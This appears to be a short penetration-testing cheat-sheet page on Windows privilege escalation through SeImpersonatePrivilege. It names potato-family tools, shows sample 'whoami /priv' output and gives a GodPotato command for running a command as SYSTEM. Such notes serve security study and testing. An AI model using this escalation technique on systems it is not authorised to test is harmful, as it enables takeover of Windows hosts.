---
description: Abusing Token for Privilege Escalation
---

# Token Abuse

## SeImpersonatePrivilege

This privilege, held by any process, allows the impersonation (but not creation) of any token, provided that a handle to it can be obtained. Generally, this token/privilege is owned by a Windows service account. You can abuse this privilege to gain NT AUTHORITY/SYSTEM access on Windows using various tools like Rogue-WinRM, RottenPotato, SweetPotato, PrintSpoofer, Juicy Potato, or the newest toolkit, **GodPotato**.

```powershell
whoami /user /priv

# Example output
USER INFORMATION
----------------

User Name                  SID     
========================== ========
nt authority\local service S-1-5-19


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeSystemtimePrivilege         Change the system time                    Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

[**GodPotato**](https://github.com/BeichenDream/GodPotato) ftw!

```powershell
GodPotato.exe -cmd "cmd /c whoami /user /priv"
```

<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi-2sRb46gem7azeW1asaORa6a-sF0DOHnyoXa3cV1cwEDgXBGWhyphenhyphen7bA6gZKo7r9Loyo2WFTYTICkpJ9mD9NkFK7sompsVjJjKMJHdaO_6xzbg1fFMJBokD59TpftFgrJLz4jShC0trppiQnf7YiQ-grYiQpCeaz4J7SRPawg9j_1a8OqhQUHx8I7Pjpc0/s1201/godpotato-PE.png" alt=""><figcaption><p>GodPotato</p></figcaption></figure>
